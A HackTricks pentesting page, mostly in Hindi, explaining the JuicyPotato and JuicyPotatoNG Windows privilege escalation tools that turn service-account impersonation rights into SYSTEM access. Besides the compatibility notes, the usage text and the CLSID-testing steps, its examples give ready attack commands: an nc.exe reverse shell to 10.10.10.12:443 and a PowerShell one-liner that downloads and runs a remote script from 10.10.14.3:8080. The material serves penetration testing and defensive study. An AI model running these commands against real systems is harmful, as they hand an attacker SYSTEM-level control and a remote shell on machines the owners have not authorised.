# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato legacy है। यह सामान्यतः Windows 10 1803 / Windows Server 2016 तक के Windows वर्शन पर काम करता है। Microsoft द्वारा Windows 10 1809 / Server 2019 में शुरू की गई hardening ने मूल तकनीक को तोड़ दिया। उन बिल्ड्स और नए वर्शनों के लिए PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato और अन्य आधुनिक विकल्पों पर विचार करें। अप-टू‑डेट विकल्पों और उपयोग के लिए नीचे दी गई पृष्ठ देखें।


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (गोल्डन privileges का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### आप juicypotato को [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) से डाउनलोड कर सकते हैं

### Compatibility quick notes

- वर्तमान context के पास `SeImpersonatePrivilege` या `SeAssignPrimaryTokenPrivilege` होने पर यह Windows 10 1803 और Windows Server 2016 तक विश्वसनीय रूप से काम करता है।
- Windows 10 1809 / Windows Server 2019 और बाद के वर्शनों में Microsoft hardening के कारण यह टूट गया है। उन बिल्ड्स के लिए ऊपर लिंक किए गए विकल्पों का उपयोग करें।

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [variants](https://github.com/decoder-it/lonelypotato) उस privilege escalation chain का उपयोग करते हैं जो `BITS` service पर आधारित है, जिसमें MiTM listener `127.0.0.1:6666` पर चलता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` privileges होते हैं। Windows build review के दौरान हमें एक सेटअप मिला जहाँ `BITS` जानबूझकर disabled था और port `6666` पहले से लिया हुआ था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को weaponize करने का निर्णय लिया: **Juicy Potato से मिलिए**।

> सिद्धांत के लिए देखें [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) और लिंक/संदर्भों की श्रृंखला का पालन करें।

हमने पाया कि `BITS` के अलावा भी कई COM servers हैं जिनका हम दुरुपयोग कर सकते हैं। उन्हें बस निम्न चाहिए:

1. वर्तमान user द्वारा instantiate किए जाने योग्य होना चाहिए, सामान्यतः एक “service user” जिसके पास impersonation privileges होते हैं
2. `IMarshal` interface को implement करना चाहिए
3. elevated user (SYSTEM, Administrator, …) के रूप में चलना चाहिए

कुछ परीक्षणों के बाद हमने कई Windows वर्शनों पर रुचिकर CLSID’s की एक विस्तृत सूची प्राप्त और परखी। [यहाँ](http://ohpe.it/juicy-potato/CLSID/) सूची OS के अनुसार व्यवस्थित मिलती है।

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato आपको निम्न करने देता है:

- **Target CLSID** _अपना कोई भी CLSID चुनें._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _आप वहां OS के अनुसार सूची पा सकते हैं._
- **COM Listening port** _अपनी पसंद का COM listening port निर्धारित करें (marshalled hardcoded 6666 की बजाय)_
- **COM Listening IP address** _सर्वर को किसी भी IP पर bind करें_
- **Process creation mode** _impersonated user के privileges के आधार पर आप निम्न में से चुन सकते हैं:_
  - `CreateProcessWithToken` (needs `SeImpersonate`)
  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
  - `both`
- **Process to launch** _यदि exploitation सफल होता है तो एक executable या script लॉन्च करें_
- **Process Argument** _लॉन्च किए गए प्रोसेस के arguments को कस्टमाइज़ करें_
- **RPC Server address** _stealthy तरीके के लिए आप किसी external RPC server पर authenticate कर सकते हैं_
- **RPC Server port** _उपयोगी जब आप external server पर authenticate करना चाहते हों और firewall port `135` ब्लॉक कर रहा हो…_
- **TEST mode** _मुख्यतः परीक्षण उद्देश्यों के लिए, जैसे CLSIDs का परीक्षण। यह DCOM बनाता है और token का user प्रिंट करता है। देखें_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` अधिकार हैं तो आप **SYSTEM** हैं।

इन सभी COM Servers के दुरुपयोग को रोकना लगभग असंभव है। आप इन ऑब्जेक्ट्स की अनुमतियों को `DCOMCNFG` के माध्यम से बदलने के बारे में सोच सकते हैं लेकिन शुभकामनाएँ — यह चुनौतीपूर्ण होगा।

वास्तविक समाधान संवेदनशील खातों और उन applications की सुरक्षा करना है जो `* SERVICE` accounts के तहत चलती हैं। `DCOM` को रोकना निश्चित रूप से इस exploit को बाधित करेगा लेकिन इससे underlying OS पर गंभीर प्रभाव पड़ सकता है।

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG आधुनिक Windows पर JuicyPotato-शैली का local privilege escalation पुनः प्रस्तुत करता है, निम्न को संयोजित करके:
- चुने हुए पोर्ट पर लोकल RPC सर्वर के लिए DCOM OXID resolution, पुराने हार्डकोडेड 127.0.0.1:6666 listener से बचते हुए।
- एक SSPI hook जो inbound SYSTEM authentication को capture और impersonate करता है बिना RpcImpersonateClient की ज़रूरत के, जो तब भी CreateProcessAsUser सक्षम करता है जब केवल SeAssignPrimaryTokenPrivilege मौजूद हो।
- DCOM activation constraints को पूरा करने के तरीके (उदा., PrintNotify / ActiveX Installer Service classes को निशाना बनाते समय पहले के INTERACTIVE-group की आवश्यकता)।

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
अगर आप Windows 10 1809 / Server 2019 को लक्षित कर रहे हैं जहाँ क्लासिक JuicyPotato पैच किया जा चुका है, तो ऊपर लिंक किए गए विकल्पों (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, आदि) को प्राथमिकता दें। NG बिल्ड और सर्विस की स्थिति पर निर्भर करके परिस्थितिजन्य हो सकता है।

## उदाहरण

नोट: कोशिश करने के लिए CLSIDs की सूची के लिए [this page](https://ohpe.it/juicy-potato/CLSID/) पर जाएँ।

### nc.exe reverse shell प्राप्त करें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### एक नई CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)

![](<../../images/image (300).png>)

## CLSID समस्याएँ

अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** और exploit विफल हो जाता है। आमतौर पर, एक **काम करने वाला CLSID** खोजने में कई प्रयास लगते हैं। किसी विशिष्ट ऑपरेटिंग सिस्टम के लिए परीक्षण करने के लिए CLSID की सूची प्राप्त करने हेतु आपको इस पृष्ठ पर जाना चाहिए:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **CLSID की जाँच**

सबसे पहले, आपको juicypotato.exe के अलावा कुछ executables चाहिए होंगे।

Join-Object.ps1 डाउनलोड करें और इसे अपनी PS session में लोड करें, और GetCLSID.ps1 डाउनलोड करके execute करें। वह script संभावित CLSID की सूची बनाएगा जिन्हें टेस्ट किया जा सकता है।

फिर test_clsid.bat डाउनलोड करें (CLSID सूची और juicypotato executable के path को बदलें) और इसे execute करें। यह हर CLSID को आजमाना शुरू कर देगा, और **जब port number बदलता है, तो इसका मतलब होगा कि CLSID काम कर गया**।

**-c पैरामीटर का उपयोग करके काम करने वाले CLSIDs की जांच करें**

## संदर्भ

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
